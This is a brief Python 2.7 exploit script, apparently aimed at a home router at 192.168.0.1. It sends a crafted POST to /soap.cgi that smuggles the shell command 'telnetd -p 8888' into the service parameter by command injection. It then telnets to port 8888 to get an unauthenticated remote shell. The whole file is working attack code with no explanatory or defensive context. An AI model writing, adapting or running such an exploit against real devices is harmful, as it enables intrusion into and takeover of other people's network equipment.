# Python 2.7
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((gethostbyname("192.168.0.1"), 80))
s.send(request)
 
sleep(1)
system('telnet 192.168.0.1 8888')
